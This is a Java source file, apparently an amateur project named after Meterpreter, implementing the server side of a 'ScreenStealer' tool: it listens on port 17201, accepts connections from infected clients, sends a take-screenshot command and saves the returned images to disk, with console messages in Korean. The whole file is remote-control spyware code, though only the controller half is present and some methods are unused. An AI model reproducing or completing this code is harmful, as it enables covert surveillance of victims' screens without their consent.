package com.meterpreter;

import java.io.DataOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

abstract class pRes {
	
	public static ArrayList<Session> sessionList;
	
	public static ServerSocket serverSocket;
	public static final int LISTEN_PORT = 17201;

	public static Socket clientSocket;
	public static DataOutputStream dos;
	public static ObjectInputStream ois;
}

abstract class Cmd {
	
	public static final String TAKE_SCREEN_SHOT = "TSS";
}

class EventManager {
	
	public void capture() {
		
		if (!sendCommand(Cmd.TAKE_SCREEN_SHOT))
			return;

		byte[] screenCaptureByteArray = getScreenCaptureByteArray();
		if (screenCaptureByteArray == null) 
			return;
		
		update(screenCaptureByteArray);
	}

	private boolean sendCommand(String cmd) {
		
		try {
			pRes.dos.writeUTF(cmd);
			return true;
		} catch (IOException e) {
			e.printStackTrace();
			return false;
		}
	}

	private byte[] getScreenCaptureByteArray() {
		
		try {
			return (byte[]) pRes.ois.readObject();
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}
	}

	private boolean update(byte[] captureImage) {
		
		try {
			String randomFileName = "" + System.currentTimeMillis() + ".jpg";
			FileOutputStream fos = new FileOutputStream(randomFileName);
			fos.write(captureImage);
			fos.close();

			System.out.println("사진을 저장했습니다.");
			return true;
		} catch (Exception e) {
			e.printStackTrace();
			return false;
		}
	}
	
	private boolean sendMessage(String msg) {
		
		return sendCommand(msg);
	}
}

class Session implements Runnable {
	
	private String ip;

	@Override
	public void run() {
		
		if (!getStream())
			return;
		
		getIpAddress();

		
	}
	
	private void getIpAddress() {

		ip = pRes.clientSocket.getInetAddress().getHostAddress();
		System.out.println("연결되었습니다\nIP : " + ip);		
	}

	private boolean getStream() {
		
		try {
			pRes.dos = new DataOutputStream(pRes.clientSocket.getOutputStream());
			pRes.ois = new ObjectInputStream(pRes.clientSocket.getInputStream());

			return true;
		} catch (Exception e) {
			System.out.println("스트림을 얻는데 실패하였습니다.");
			return false;
		}
	}
}

public class ScreenStealerServer {

	public void activate() {
		
		if (!initServer())
			return;

		acceptClient();
	}

	private boolean initServer() {
		
		try {
			pRes.serverSocket = new ServerSocket(pRes.LISTEN_PORT);
			return true;
		} catch (IOException e) {
			System.out.println("포트가 이미 사용중입니다.");
			return false;
		}
	}

	private void acceptClient() {
		
		while (true) {
			try {
				pRes.clientSocket = pRes.serverSocket.accept();
				new Thread(new Session()).start();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
	public static void main(String[] args) {
		
		ScreenStealerServer meterpreter = new ScreenStealerServer();
		meterpreter.activate();
	}
}